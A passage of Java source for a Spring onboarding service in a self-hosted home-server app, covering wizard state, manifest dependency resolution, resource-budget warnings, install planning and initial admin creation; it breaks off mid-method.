package com.tomaytotomato.aurora.services;

import com.tomaytotomato.aurora.config.AuroraProperties;
import com.tomaytotomato.aurora.domain.Package;
import com.tomaytotomato.aurora.persistence.AdminUserRepo;
import com.tomaytotomato.aurora.persistence.AuditEventRepo;
import com.tomaytotomato.aurora.persistence.SettingsRepo;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;
import org.springframework.stereotype.Service;

import java.io.IOException;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.StandardOpenOption;
import java.util.ArrayList;
import java.util.List;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

/**
 * Coordinates the first-run wizard. Two ways this is "done":
 * <ol>
 *   <li>An admin user has been created — most auth-related endpoints unlock.</li>
 *   <li>The {@code onboarding.complete} setting is true — the SPA shows the
 *       normal app shell instead of the wizard.</li>
 * </ol>
 * These are separate so a user who creates an admin but abandons the wizard
 * still gets back into it on the next visit.
 */
@Service
public class OnboardingService {

  private static final Logger log = LoggerFactory.getLogger(OnboardingService.class);
  private static final String KEY_COMPLETE  = "onboarding.complete";
  private static final String KEY_STEP      = "onboarding.step";
  private static final String KEY_DNS_MODE  = "onboarding.dns_mode";

  private static final java.util.Set<String> VALID_DNS_MODES =
      java.util.Set.of("adguard", "router", "mdns");

  // "packages" dropped (2026-08-15): the interactive package-picker step
  // was removed from the wizard — see docs note in OnboardingDomain.vue —
  // so it is no longer a step a client can resume into. "sso" was never
  // added here either; the resume-hint jumps straight past it into
  // "secrets", same as it always has (see setDomain()).
  private static final java.util.Set<String> VALID_STEPS = java.util.Set.of(
      "welcome", "admin", "domain", "secrets", "dns", "tls", "review", "done"
  );

  private final AdminUserRepo users;
  private final AuditEventRepo audit;
  private final SettingsRepo settings;
  private final AuthService auth;
  private final StateFileService stateFiles;
  private final PackagesService packages;
  private final SystemService system;
  private final AuroraProperties props;
  private final PackageNameValidator packageNames;

  @org.springframework.beans.factory.annotation.Autowired
  public OnboardingService(AdminUserRepo users, AuditEventRepo audit, SettingsRepo settings,
                           AuthService auth, StateFileService stateFiles,
                           PackagesService packages, SystemService system,
                           AuroraProperties props,
                           PackageNameValidator packageNames) {
    this.users = users;
    this.audit = audit;
    this.settings = settings;
    this.auth = auth;
    this.stateFiles = stateFiles;
    this.packages = packages;
    this.system = system;
    this.props = props;
    this.packageNames = packageNames;
  }

  /**
   * Legacy 8-arg constructor retained for tests that don't exercise the
   * name-validation path. Production wiring uses the 9-arg form via Spring.
   */
  public OnboardingService(AdminUserRepo users, AuditEventRepo audit, SettingsRepo settings,
                           AuthService auth, StateFileService stateFiles,
                           PackagesService packages, SystemService system,
                           AuroraProperties props) {
    this(users, audit, settings, auth, stateFiles, packages, system, props, null);
  }

  /** True when there is no admin user yet — onboarding endpoints are unauthenticated. */
  public boolean isBootstrapMode() {
    return users.count() == 0L;
  }

  public boolean isComplete() {
    return settings.get(KEY_COMPLETE).map("true"::equals).orElse(false);
  }

  public String currentStep() {
    return settings.get(KEY_STEP).orElse("welcome");
  }

  public java.util.Optional<String> dnsMode() {
    return settings.get(KEY_DNS_MODE);
  }

  /**
   * Full draft the SPA hydrates from on load. Never returns password hash or
   * any other secret; only what the wizard needs to prefill its forms.
   */
  public java.util.Map<String, Object> summary() {
    var state = stateFiles.readState();
    String adminUsername = users.findFirst()
        .map(com.tomaytotomato.aurora.domain.AdminUser::username)
        .orElse(null);
    var m = new java.util.LinkedHashMap<String, Object>();
    m.put("complete", isComplete());
    m.put("bootstrap_mode", isBootstrapMode());
    m.put("step", currentStep());
    m.put("admin_username", adminUsername);
    m.put("domain", state.domain());
    m.put("enabled_packages", state.enabled() == null ? List.of() : state.enabled());
    m.put("dns_mode", dnsMode().orElse(null));
    return m;
  }

  /**
   * Apply a partial update to the wizard draft. Any {@code null} field is
   * left untouched. Requires an admin to exist and onboarding to not be
   * complete — same guard as the legacy POST field routes.
   *
   * <p>The {@code step} field is advisory: the client tells the server
   * "user is on step X" so a resume-from-another-device UX has a hint.
   * The server never rejects a step value; the client URL is the real cursor.
   */
  public java.util.Map<String, Object> patch(PatchDraft p) {
    guardMidOnboarding();
    if (p.domain() != null)          setDomain(p.domain());
    if (p.enabledPackages() != null) setEnabledPackages(p.enabledPackages());
    if (p.dnsMode() != null)         setDnsMode(p.dnsMode());
    if (p.step() != null)            setStepHint(p.step());
    return summary();
  }

  public void setDnsMode(String mode) {
    if (mode == null) throw new IllegalArgumentException("dns_mode required");
    String v = mode.trim().toLowerCase();
    if (!VALID_DNS_MODES.contains(v)) {
      throw new IllegalArgumentException("dns_mode must be one of: adguard, router, mdns");
    }
    settings.put(KEY_DNS_MODE, v);
    audit.record(null, "onboarding.dns.set", "dns:" + v, null);
    // Advance the server-side step cursor forward but never backward.
    if (rank(currentStep()) < rank("tls")) settings.put(KEY_STEP, "tls");
  }

  public void setStepHint(String step) {
    if (step == null || step.isBlank()) return;
    String s = step.trim().toLowerCase();
    if (!VALID_STEPS.contains(s)) return; // ignore junk hints silently
    settings.put(KEY_STEP, s);
  }

  /**
   * Guard mutations that require the admin to already exist and onboarding
   * not to be complete. Thrown as {@link IllegalStateException} so the
   * controller maps it to 409 CONFLICT.
   */
  public void guardMidOnboarding() {
    if (isBootstrapMode()) {
      throw new IllegalStateException("create an admin user first via POST /api/onboarding/admin");
    }
    if (isComplete()) {
      throw new IllegalStateException("onboarding already complete; use authenticated endpoints");
    }
  }

  private static int rank(String step) {
    return switch (step == null ? "" : step) {
      case "welcome"  -> 0;
      case "admin"    -> 1;
      case "domain"   -> 2;
      case "secrets"  -> 4;
      case "dns"      -> 5;
      case "tls"      -> 6;
      case "review"   -> 7;
      case "done"     -> 8;
      default          -> -1;
    };
  }

  /** Draft payload for {@link #patch(PatchDraft)}. Null fields are no-ops. */
  public record PatchDraft(
      String domain,
      List<String> enabledPackages,
      String dnsMode,
      String step
  ) {}

  private static String firstWord(String s) {
    if (s == null) return "";
    String t = s.trim();
    int i = t.indexOf(' ');
    return i < 0 ? t : t.substring(0, i);
  }

  // ------------------------------------------------------------------
  // Manifest-driven resource warnings (v0.2)
  // ------------------------------------------------------------------

  /**
   * Collect host resource facts once so every warning evaluation sees a
   * consistent snapshot. Wrapped in try/catch — a partial snapshot is
   * better than a 500 on the plan endpoint.
   */
  @SuppressWarnings("unchecked")
  java.util.Map<String, Object> hostSnapshot() {
    var s = new java.util.HashMap<String, Object>();
    try { s.put("cpu",    system.cpu());    } catch (Exception e) { s.put("cpu", java.util.Map.of()); }
    try { s.put("memory", system.readMemInfoPublic()); } catch (Exception e) { s.put("memory", java.util.Map.of()); }
    try { s.put("disks",  system.disks());  } catch (Exception e) { s.put("disks", List.of()); }
    try { s.put("gpu",    system.gpu());    } catch (Exception e) { s.put("gpu", java.util.Map.of("present", false)); }
    return s;
  }

  /**
   * Evaluate a manifest {@code warnings[].if} clause against the host
   * snapshot. Supported keys:
   * <ul>
   *   <li>{@code no_gpu: true} — fires when no GPU detected.</li>
   *   <li>{@code ram_below_mb: N} — fires when MemTotal &lt; N megabytes.</li>
   *   <li>{@code cpu_threads_lt: N} — fires when cpu.threads &lt; N.</li>
   *   <li>{@code free_disk_gb_below: N} — fires when the largest disk's
   *       free space is &lt; N gigabytes.</li>
   * </ul>
   * Unknown keys never fire (fail-closed).
   */
  @SuppressWarnings("unchecked")
  boolean evaluateWarningCondition(java.util.Map<String, Object> warning,
                                   java.util.Map<String, Object> host) {
    Object rawIf = warning.get("if");
    if (!(rawIf instanceof java.util.Map<?, ?> cond)) return false;

    var cpu    = (java.util.Map<String, Object>) host.getOrDefault("cpu", java.util.Map.of());
    var mem    = (java.util.Map<String, Object>) host.getOrDefault("memory", java.util.Map.of());
    var gpu    = (java.util.Map<String, Object>) host.getOrDefault("gpu", java.util.Map.of());
    var disks  = (List<java.util.Map<String, Object>>) host.getOrDefault("disks", List.of());

    for (var e : cond.entrySet()) {
      String key = String.valueOf(e.getKey());
      Object val = e.getValue();
      switch (key) {
        case "no_gpu" -> {
          boolean want = Boolean.TRUE.equals(val);
          boolean present = Boolean.TRUE.equals(gpu.get("present"));
          if (want && present) return false;
          if (!want && !present) return false;
        }
        case "ram_below_mb" -> {
          if (!(val instanceof Number n)) return false;
          Object total = mem.get("MemTotal");
          if (!(total instanceof Number tn)) return false;
          if (tn.longValue() >= n.longValue() * 1024L * 1024L) return false;
        }
        case "cpu_threads_lt" -> {
          if (!(val instanceof Number n)) return false;
          Object t = cpu.get("threads");
          if (!(t instanceof Number tn)) return false;
          if (tn.intValue() >= n.intValue()) return false;
        }
        case "free_disk_gb_below" -> {
          if (!(val instanceof Number n)) return false;
          long maxFree = 0L;
          for (var d : disks) {
            Object f = d.get("free_bytes");
            if (f instanceof Number fn && fn.longValue() > maxFree) maxFree = fn.longValue();
          }
          if (maxFree == 0L) return false; // no disk data — don't cry wolf
          if (maxFree >= n.longValue() * 1024L * 1024L * 1024L) return false;
        }
        default -> { return false; } // unknown key: fail-closed
      }
    }
    return true;
  }

  private static final Pattern INTERP = Pattern.compile("\\$\\{([a-zA-Z_][a-zA-Z0-9_.]*)}");

  /**
   * Expand {@code ${cpu.threads}} / {@code ${memory.MemTotal_gb}} /
   * {@code ${gpu.model}} references in a message. Missing paths render
   * literally so a mistyped placeholder is visible in QA.
   */
  @SuppressWarnings("unchecked")
  String interpolate(String msg, java.util.Map<String, Object> host) {
    if (msg == null) return "";
    Matcher m = INTERP.matcher(msg);
    var out = new StringBuilder();
    while (m.find()) {
      String path = m.group(1);
      Object v = resolvePath(path, host);
      m.appendReplacement(out, Matcher.quoteReplacement(v == null ? "${" + path + "}" : v.toString()));
    }
    m.appendTail(out);
    return out.toString();
  }

  @SuppressWarnings("unchecked")
  Object resolvePath(String path, java.util.Map<String, Object> host) {
    // Support _gb / _mb suffixes on the leaf to auto-convert byte fields.
    String[] parts = path.split("\\.");
    Object cur = host;
    for (int i = 0; i < parts.length; i++) {
      String key = parts[i];
      boolean last = (i == parts.length - 1);
      String unit = null;
      if (last && (key.endsWith("_gb") || key.endsWith("_mb") || key.endsWith("_kb"))) {
        unit = key.substring(key.length() - 2);
        key = key.substring(0, key.length() - 3);
      }
      if (!(cur instanceof java.util.Map<?, ?> mm)) return null;
      cur = ((java.util.Map<String, Object>) mm).get(key);
      if (cur == null) return null;
      if (last && unit != null && cur instanceof Number nn) {
        long bytes = nn.longValue();
        return switch (unit) {
          case "gb" -> String.format("%.1f", bytes / (1024.0 * 1024.0 * 1024.0));
          case "mb" -> String.format("%.0f", bytes / (1024.0 * 1024.0));
          case "kb" -> String.format("%.0f", bytes / 1024.0);
          default   -> nn.toString();
        };
      }
    }
    return cur;
  }

  // ------------------------------------------------------------------
  // Dependency resolution (manifest depends_on / recommends)
  //
  // scripts/up.sh never installs exactly the packages the wizard asked
  // for: manifest_resolve_deps (scripts/lib/manifest.sh) pulls in every
  // hard depends_on transitively before docker compose ever sees the
  // list, dies on a dependency cycle, and dies again if a dependency
  // names a package with no manifest. Before this, plan() only knew
  // about two hand-hardcoded pairs (media/privacy, adguard-dns/privacy)
  // and never walked depends_on at all, so the Review screen could show
  // a smaller package set than up.sh was actually about to install.
  // The resolver below mirrors the shell routine so the preview and the
  // real installer never disagree.
  // ------------------------------------------------------------------

  /**
   * Result of walking {@code depends_on} for a requested package selection.
   *
   * @param resolved             {@code requested} plus every hard dependency
   *                             pulled in transitively, dependency-first
   *                             (a dependency always appears before the
   *                             package that needed it — same order
   *                             {@code manifest_resolve_deps} produces).
   * @param addedDependencies    names present in {@code resolved} that were
   *                             not in the original request: the ones
   *                             Aurora is turning on automatically.
   * @param requiredBy           added dependency name -&gt; names of the
   *                             packages whose {@code depends_on} pulled it
   *                             in. Drives the "X needs Y" copy.
   * @param danglingDependencies {@code "pkg -> missing"} entries where
   *                             {@code pkg} depends on a name with no
   *                             manifest at all. Always a manifest bug.
   * @param cycles               each detected dependency loop as an ordered
   *                             path back to its own start (e.g.
   *                             {@code [a, b, a]}). Also always a bug.
   */
  record DependencyResolution(
      List<String> resolved,
      List<String> addedDependencies,
      java.util.Map<String, List<String>> requiredBy,
      List<String> danglingDependencies,
      List<List<String>> cycles
  ) {}

  /**
   * Walk {@code depends_on} from every name in {@code requested}. A plain
   * visited-set walk would never terminate on a genuine cycle, so this
   * uses the standard white/gray/black colouring: a gray node revisited
   * mid-walk is a cycle (recorded, not thrown — one broken pair shouldn't
   * crash the whole plan), and a dependency name absent from {@code byName}
   * is recorded as dangling rather than silently skipped.
   */
  DependencyResolution resolveDependencies(List<String> requested,
                                           java.util.Map<String, Package> byName) {
    var requestedOrder = new java.util.LinkedHashSet<>(requested);
    var resolved = new java.util.LinkedHashSet<String>();
    var dangling = new java.util.LinkedHashSet<String>();
    var cycles = new ArrayList<List<String>>();
    var color = new java.util.HashMap<String, Integer>(); // 1 = visiting (gray), 2 = done (black)
    var path = new ArrayList<String>();

    for (String root : requestedOrder) {
      walkDependsOn(root, byName, resolved, dangling, cycles, color, path);
    }

    // Anything caught up in a cycle is reported by the cycle message alone —
    // it's not a safe "Aurora will just turn this on for you" auto-add,
    // it's half of a manifest bug, so don't also list it as one.
    var cycleNodes = new java.util.HashSet<String>();
    for (var cycle : cycles) cycleNodes.addAll(cycle);

    var addedDependencies = new ArrayList<String>();
    for (String name : resolved) {
      if (!requestedOrder.contains(name) && !cycleNodes.contains(name)) addedDependencies.add(name);
    }

    var requiredBy = new java.util.LinkedHashMap<String, List<String>>();
    for (String name : resolved) {
      Package pkg = byName.get(name);
      if (pkg == null) continue;
      for (String dep : pkg.dependsOn()) {
        if (addedDependencies.contains(dep)) {
          requiredBy.computeIfAbsent(dep, k -> new ArrayList<>()).add(name);
        }
      }
    }

    return new DependencyResolution(new ArrayList<>(resolved), addedDependencies,
        requiredBy, new ArrayList<>(dangling), cycles);
  }

  private void walkDependsOn(String name, java.util.Map<String, Package> byName,
                             java.util.LinkedHashSet<String> resolved,
                             java.util.LinkedHashSet<String> dangling,
                             List<List<String>> cycles,
                             java.util.Map<String, Integer> color,
                             List<String> path) {
    Integer state = color.get(name);
    if (state != null && state == 2) return; // already fully resolved
    if (state != null && state == 1) {
      int idx = path.indexOf(name);
      var cycle = new ArrayList<>(path.subList(idx, path.size()));
      cycle.add(name);
      cycles.add(cycle);
      return;
    }
    Package pkg = byName.get(name);
    if (pkg == null) return; // unknown package name; caller-side validation's job

    color.put(name, 1);
    path.add(name);
    for (String dep : pkg.dependsOn()) {
      if (!byName.containsKey(dep)) {
        dangling.add(name + " -> " + dep);
        continue;
      }
      walkDependsOn(dep, byName, resolved, dangling, cycles, color, path);
    }
    path.remove(path.size() - 1);
    color.put(name, 2);
    resolved.add(name);
  }

  /**
   * Plain-English copy for the auto-added hard dependencies and any
   * manifest bugs {@link #resolveDependencies} turned up. Per
   * docs/UX_SPEC.md P4 every line is a full sentence ending in
   * punctuation and never carries an internal rule-id token.
   *
   * <p>{@code core} is skipped in the auto-add loop on purpose: the two
   * dedicated core messages in {@link #plan(List)} already tell that
   * story, so a third generic line would just repeat it.
   */
  List<String> dependencyWarnings(DependencyResolution resolution) {
    var out = new ArrayList<String>();

    for (String added : resolution.addedDependencies()) {
      if ("core".equals(added)) continue;
      var requesters = resolution.requiredBy().getOrDefault(added, List.of());
      out.add(prettyPackageName(added) + " is needed by " + joinPretty(requesters)
          + " but is not selected — Aurora will turn it on for you.");
    }

    for (String edge : resolution.danglingDependencies()) {
      String[] parts = edge.split(" -> ", 2);
      String from = prettyPackageName(parts[0]);
      out.add(from + " depends on a package called '" + parts[1] + "', but no such package exists. "
          + "That's a bug in " + from + "'s manifest, not something you did — installing will fail until it's fixed.");
    }

    for (var cycle : resolution.cycles()) {
      var names = cycle.stream().map(this::prettyPackageName).toList();
      out.add("Aurora can't work out how to install " + String.join(" → ", names)
          + " — they depend on each other in a loop. That's a bug in their manifests, "
          + "not something you did — installing will fail until it's fixed.");
    }

    return out;
  }

  /**
   * Advisory copy for {@code recommends} entries missing from the final
   * resolved set. Never phrased as an error: the install proceeds fine
   * without them, it's just a suggestion.
   */
  List<String> recommendsWarnings(List<String> resolvedEnabled,
                                  java.util.Map<String, Package> byName) {
    var present = new java.util.LinkedHashSet<>(resolvedEnabled);
    var out = new ArrayList<String>();
    for (String name : resolvedEnabled) {
      Package pkg = byName.get(name);
      if (pkg == null) continue;
      for (String rec : pkg.recommends()) {
        if (!present.contains(rec)) {
          out.add(prettyPackageName(name) + " works best alongside " + prettyPackageName(rec)
              + ", which is not selected. It will still work without it, but you may want to add it later.");
        }
      }
    }
    return out;
  }

  private String joinPretty(List<String> names) {
    if (names.isEmpty()) return "another package";
    var pretty = names.stream().map(this::prettyPackageName).toList();
    if (pretty.size() == 1) return pretty.get(0);
    return String.join(", ", pretty.subList(0, pretty.size() - 1)) + " and " + pretty.get(pretty.size() - 1);
  }

  private static final java.util.Map<String, String> NAME_ACRONYMS = java.util.Map.of(
      "ai", "AI", "vpn", "VPN", "tls", "TLS", "dns", "DNS", "dlna", "DLNA", "smb", "SMB");

  /**
   * Turn a package slug into the same readable label the frontend shows on
   * its badge chips ({@code frontend/src/lib/packageName.ts::prettyPackageName}),
   * so a warning that names "Identity" and a pill that reads "Identity" are
   * obviously the same package.
   */
  String prettyPackageName(String slug) {
    if (slug == null || slug.isBlank()) return "";
    String[] words = slug.split("-");
    var out = new StringBuilder();
    for (int i = 0; i < words.length; i++) {
      if (i > 0) out.append(' ');
      String w = words[i];
      String acronym = NAME_ACRONYMS.get(w.toLowerCase());
      out.append(acronym != null ? acronym : capitalize(w));
    }
    return out.toString();
  }

  private static String capitalize(String w) {
    if (w.isEmpty()) return w;
    return Character.toUpperCase(w.charAt(0)) + w.substring(1);
  }

  // ------------------------------------------------------------------
  // Install
  // ------------------------------------------------------------------

  /**
   * The packages every first-run box gets regardless of anything a client
   * PATCHed — the reverse proxy ({@code core}) and LAN file sharing
   * ({@code storage}). Mirrors the frontend's {@code isCorePackage()}
   * authority (see {@code frontend/src/api/packages.ts}) minus {@code
   * identity}: whether Authelia/SSO is enabled stays a deliberate yes/no
   * asked by the onboarding SSO step (still a wizard step in its own
   * right) rather than something this belt-and-braces forcing overrides.
   * Forcing identity on here too would silently undo an operator's
   * explicit "skip SSO" choice — and worse, do it without ever generating
   * its secrets, since that only happens via {@code POST /onboarding/sso}.
   */
  private static final List<String> MANDATORY_PACKAGES = List.of("core", "storage");

  /**
   * Apply the wizard draft. In v0.1 this means:
   *   1. Ensure the mandatory packages are in the enabled set (they're required).
   *   2. Write .state.yml (already done by earlier PATCHes, this is idempotent).
   *   3. Report which packages have containers up vs. which need to be started.
   * It does <b>not</b> spawn containers itself — aurora's container image
   * does not carry the docker CLI or the compose plugin, so bringing new
   * services up is delegated to {@code scripts/up.sh} on the host.
   *
   * <p>Does not mark onboarding complete; the client calls {@code /complete}
   * separately once the user has read the summary on the Done screen.
   */
  public java.util.Map<String, Object> install() {
    guardMidOnboarding();

    var applied = new java.util.ArrayList<String>();

    // 1. Force the mandatory set on. Anything relying on ".enabled
    // contains 'core'" (or 'storage') is guaranteed to hold after this
    // call — belt-and-braces in case a step got skipped via the sidebar,
    // same reasoning OnboardingReview.vue's own comment already gives for
    // its PATCH immediately before this endpoint is called.
    var state = stateFiles.readState();
    var requested = new java.util.ArrayList<>(state.enabled() == null ? List.of() : state.enabled());
    var wasMissing = new java.util.LinkedHashSet<String>();
    int insertAt = 0;
    for (String mandatory : MANDATORY_PACKAGES) {
      if (!requested.contains(mandatory)) {
        requested.add(insertAt++, mandatory);
        wasMissing.add(mandatory);
      }
    }

    // 1b. Resolve the rest of the hard-dependency closure exactly the way
    // scripts/up.sh's manifest_resolve_deps would, and persist THAT set —
    // not the raw request — so .state.yml (and therefore what /launch
    // hands to up.sh) always matches what /plan already told the user
    // would happen.
    var allPackages = packages.list();
    var byName = new java.util.LinkedHashMap<String, Package>();
    for (var p : allPackages) byName.put(p.name(), p);
    var resolution = resolveDependencies(requested, byName);
    var enabledOrder = new java.util.LinkedHashSet<String>(requested);
    enabledOrder.addAll(resolution.resolved());
    var enabled = new java.util.ArrayList<>(enabledOrder);

    for (String mandatory : MANDATORY_PACKAGES) {
      applied.add(wasMissing.contains(mandatory)
          ? "Added " + prettyPackageName(mandatory) + " to enabled_packages (was missing; "
              + prettyPackageName(mandatory) + " is required)."
          : prettyPackageName(mandatory) + " is enabled.");
    }
    for (String added : resolution.addedDependencies()) {
      if (MANDATORY_PACKAGES.contains(added)) continue;
      var requesters = resolution.requiredBy().getOrDefault(added, List.of());
      applied.add("Added " + prettyPackageName(added) + " to enabled_packages ("
          + joinPretty(requesters) + " requires it).");
    }
    for (String warning : dependencyWarnings(resolution)) {
      // Cycles/dangling deps mean up.sh's own resolver will refuse to
      // install at all; surface that in the applied log rather than
      // burying it, even though this endpoint doesn't abort the request.
      applied.add(warning);
    }

    stateFiles.writeEnabled(enabled);
    applied.add("Wrote .state.yml with " + enabled.size() + " package"
        + (enabled.size() == 1 ? "" : "s") + ".");
    applied.add("Wrote packages/core/.env DOMAIN=" + (state.domain() == null ? "aurora.local" : state.domain()) + ".");

    // 2. Diff enabled vs. running so the Done screen can tell the user
    // which packages still need `scripts/up.sh`.
    var toStart = packages.enabledNotRunning();
    var toStop  = packages.runningNotEnabled();

    audit.record(null, "onboarding.install", null,
        "{\"enabled\":" + toJsonArray(enabled)
         + ",\"to_start\":" + toJsonArray(toStart)
         + ",\"to_stop\":"  + toJsonArray(toStop) + "}");

    var out = new java.util.LinkedHashMap<String, Object>();
    out.put("applied", applied);
    out.put("packages_to_start", toStart);
    out.put("packages_to_stop", toStop);   // v0.1 never actually stops — informational
    out.put("host_command", "cd ~/aurora.local && ./scripts/up.sh");
    return out;
  }

  /**
   * Compute a preview of what "Install" would do. Read-only: reads the
   * enabled set from .state.yml, cross-references package manifests for
   * ports, and derives probable vhosts from port descriptions + the
   * naming convention (subdomain == container name).
   *
   * <p>vhost derivation is a best-effort surface — the authoritative list
   * lives in Caddy's rendered config. The Review screen frames it as "what
   * you should expect to see," not a guarantee.
   */
  public java.util.Map<String, Object> plan() {
    return plan(null);
  }

  /**
   * Compute the install plan. If {@code enabledOverride} is non-null it is
   * used in place of {@code .state.yml}'s enabled list, so the SPA can
   * preview warnings for a hypothetical selection without PATCHing state.
   * A null override falls back to the persisted selection (canonical use
   * from Review).
   */
  public java.util.Map<String, Object> plan(List<String> enabledOverride) {
    var state = stateFiles.readState();
    List<String> requested = enabledOverride != null
        ? enabledOverride
        : (state.enabled() == null ? List.of() : state.enabled());
    String domain = state.domain();

    var allPackages = packages.list();
    var byName = new java.util.LinkedHashMap<String, Package>();
    for (var p : allPackages) byName.put(p.name(), p);

    // Resolve depends_on into the same closure scripts/up.sh would arrive
    // at via manifest_resolve_deps, so this preview never promises fewer
    // packages than install actually brings up. `enabled` below is that
    // resolved set — the user's own order first, then anything Aurora is
    // adding on their behalf.
    var resolution = resolveDependencies(requested, byName);
    var enabledOrder = new java.util.LinkedHashSet<String>(requested);
    enabledOrder.addAll(resolution.resolved());
    List<String> enabled = new ArrayList<>(enabledOrder);

    var enabledManifests = allPackages.stream()
        .filter(p -> enabled.contains(p.name()))
        .toList();

    // Ports: aggregate from every enabled manifest. TreeSet to sort + dedup.
    var ports = new java.util.TreeSet<Integer>();
    for (var pkg : enabledManifests) {
      for (var entry : pkg.ports()) {
        Object p = entry.get("port");
        if (p instanceof Number n) ports.add(n.intValue());
      }
    }

    // vhosts: convention is <service>.<domain> where <service> matches a
    // container_name in the package compose. We derive from port descriptions
    // because manifests don't list vhosts explicitly; single-word descriptions
    // ("Sonarr", "Radarr") are treated as subdomains, and generic infra labels
    // ("Caddy HTTP", "AdGuard DNS", etc.) are dropped.
    var vhosts = new java.util.TreeSet<String>();
    if (domain != null && !domain.isBlank()) {
      if (enabled.contains("core")) {
        vhosts.add(domain);
        vhosts.add("admin." + domain);
      }
      for (var pkg : enabledManifests) {
        if ("core".equals(pkg.name())) continue;
        for (var entry : pkg.ports()) {
          Object desc = entry.get("description");
          Object portNum = entry.get("port");
          Object proto = entry.get("proto");
          if (desc == null) continue;
          if (proto != null && !"tcp".equalsIgnoreCase(proto.toString())) continue;
          if (portNum instanceof Number n && NON_HTTP_PORTS.contains(n.intValue())) continue;
          String sub = firstWord(desc.toString()).toLowerCase();
          if (sub.isEmpty()) continue;
          if (sub.contains("http")) continue;               // "HTTP", "HTTPS" labels
          if (NON_HTTP_SUBDOMAINS.contains(sub)) continue;
          if (!sub.matches("[a-z0-9][a-z0-9-]*")) continue; // sanity
          vhosts.add(sub + "." + domain);
        }
      }
    }

    // Warnings: light static checks, plus the manifest-derived ones below.
    var warnings = new java.util.ArrayList<String>();
    String dns = dnsMode().orElse(null);
    if ("adguard".equals(dns) && !enabled.contains("privacy")) {
      warnings.add("DNS mode is 'adguard' but the privacy package (which provides AdGuard Home) is not selected.");
    }
    if (domain == null || domain.isBlank()) {
      warnings.add("Domain not set — vhosts cannot be rendered until you complete step 3.");
    }
    if (requested.isEmpty()) {
      warnings.add("No packages selected. Core is required and will be forced on at install.");
    } else if (!requested.contains("core")) {
      warnings.add("Core is not in the enabled set but is required — it will be added at install.");
    }

    // depends_on / recommends, walked from the manifests rather than
    // hand-hardcoded pairs (this used to be a single "media without
    // privacy" string comparison, which is why nothing else was ever
    // caught). Hard deps were already folded into `enabled` above;
    // these two calls turn that resolution into the copy the wizard shows.
    warnings.addAll(dependencyWarnings(resolution));
    warnings.addAll(recommendsWarnings(enabled, byName));

    // Manifest-driven resource warnings. Snapshot the host once and
    // evaluate each enabled package's declared warnings against it.
    var host = hostSnapshot();
    for (String pkgName : enabled) {
      for (var w : packages.readWarnings(pkgName)) {
        if (evaluateWarningCondition(w, host)) {
          Object msg = w.get("message");
          if (msg != null) warnings.add(interpolate(msg.toString(), host));
        }
      }
    }

    // Running resource budget: sum requires.min_ram_mb / min_disk_gb
    // across enabled packages and warn if the total exceeds 85% of what
    // the host actually has. This runs alongside the per-manifest
    // predicates above — predicates catch "this one package won't fit";
    // the budget catches "the whole selection won't fit".
    warnings.addAll(evaluateResourceBudget(enabled, host));

    var out = new java.util.LinkedHashMap<String, Object>();
    out.put("packages_to_enable", enabled);
    out.put("packages_to_disable", List.of());   // v0.1: no diff engine
    out.put("vhosts", new java.util.ArrayList<>(vhosts));
    out.put("ports", new java.util.ArrayList<>(ports));
    out.put("warnings", warnings);
    return out;
  }

  /**
   * Sum {@code requires.min_ram_mb} and {@code requires.min_disk_gb}
   * across enabled packages and compare against host facts. Emits a
   * synthetic warning when the total is above 85% of available. Silent
   * when host facts are absent (better than crying wolf on a partial
   * snapshot). Codes {@code budget_ram_high} / {@code budget_disk_high}
   * are reserved in the message text for the frontend to key on.
   */
  @SuppressWarnings("unchecked")
  List<String> evaluateResourceBudget(List<String> enabled,
                                      java.util.Map<String, Object> host) {
    var out = new ArrayList<String>();
    long ramMb = 0L;
    long diskGb = 0L;
    for (String pkg : enabled) {
      var req = packages.readRequires(pkg);
      Object r = req.get("min_ram_mb");
      if (r instanceof Number rn) ramMb += rn.longValue();
      Object d = req.get("min_disk_gb");
      if (d instanceof Number dn) diskGb += dn.longValue();
    }

    // RAM budget vs. MemTotal (bytes).
    var mem = (java.util.Map<String, Object>) host.getOrDefault("memory", java.util.Map.of());
    Object memTotal = mem.get("MemTotal");
    if (ramMb > 0 && memTotal instanceof Number mn) {
      long hostMb = mn.longValue() / (1024L * 1024L);
      if (hostMb > 0 && ramMb > (long) (hostMb * 0.85)) {
        double totalGb = ramMb / 1024.0;
        double hostGb  = hostMb / 1024.0;
        out.add(String.format(
            "budget_ram_high: selected packages request ~%.1f GB RAM total; this box has %.1f GB. Expect swapping or OOM under load.",
            totalGb, hostGb));
      }
    }

    // Disk budget vs. the disk with the most free space (matches
    // free_disk_gb_below semantics — same disk = same yardstick).
    var disks = (List<java.util.Map<String, Object>>) host.getOrDefault("disks", List.of());
    long maxFreeBytes = 0L;
    for (var disk : disks) {
      Object f = disk.get("free_bytes");
      if (f instanceof Number fn && fn.longValue() > maxFreeBytes) maxFreeBytes = fn.longValue();
    }
    if (diskGb > 0 && maxFreeBytes > 0) {
      long freeGb = maxFreeBytes / (1024L * 1024L * 1024L);
      if (freeGb > 0 && diskGb > (long) (freeGb * 0.85)) {
        out.add(String.format(
            "budget_disk_high: selected packages request ~%d GB disk total; largest drive has %d GB free. Consider fewer packages or a bigger disk.",
            diskGb, freeGb));
      }
    }
    return out;
  }

  // Ports/descriptions that look like a subdomain but aren't fronted by
  // Caddy — they're L4/UDP/infra services with no HTTP UI. Keep the list
  // small and explicit; adding false positives is worse than missing one.
  private static final java.util.Set<String> NON_HTTP_SUBDOMAINS = java.util.Set.of(
      "caddy", "samba", "smb", "minidlna", "upnp", "ssdp",
      "dns", "dhcp", "gluetun", "vpn", "mqtt", "mosquitto"
  );
  private static final java.util.Set<Integer> NON_HTTP_PORTS = java.util.Set.of(
      53,   // DNS
      67, 68,   // DHCP
      137, 138, 139, 445, // NetBIOS / SMB
      1883, 8883,         // MQTT
      1900, 5353,         // SSDP / mDNS
      8200                // MiniDLNA
  );

  /**
   * Create the initial admin. Refuses if an admin already exists.
   * @return the newly-created id
   */
  public long createInitialAdmin(String username, String password, String tz) {
    if (!isBootstrapMode()) {
      throw new IllegalStateException("admin already exists; onboarding is closed");
    }
    if (username == null || username.isBlank()) throw new IllegalArgumentException("username required");
    if (password == null || password.length() < 12) throw new IllegalArgumentException("password must be at least 12 chars");
    String hash = auth.hash(password.toCharArray());
    long id = users.create(username.trim(), hash, tz == null || tz.isBlank() ? "UTC" : tz);
    audit.record(id, "onboarding.admin.create", "admin_user:" + id, null);
